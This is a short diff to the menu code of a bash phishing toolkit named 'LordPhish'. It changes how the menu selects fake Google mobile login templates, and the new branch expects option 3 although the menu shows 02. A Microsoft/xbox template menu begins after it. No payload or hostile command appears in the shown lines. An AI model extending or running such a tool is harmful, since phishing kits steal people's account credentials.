@@ -611,11 +611,11 @@ list_gm() {
     printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Google mobile2\e[0m\n"
     read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' 
 if [[ $option == 1 ]]; then
-server="Google_mobile"
+server="google_mobile"
 start1
     
-elif [[ $option == 2 ]]; then
-server="Google_mobile2"
+elif [[ $option == 3 || $option == 03 ]]; then
+server="google_mobile"
 start1
 
 else
@@ -658,6 +658,7 @@ printf "\e[1;93m [!] Invalid option!\e[0m\n"
 menu
 fi
 }
+
 microsoft () {
     banner
     printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m xbox\e[0m\n"
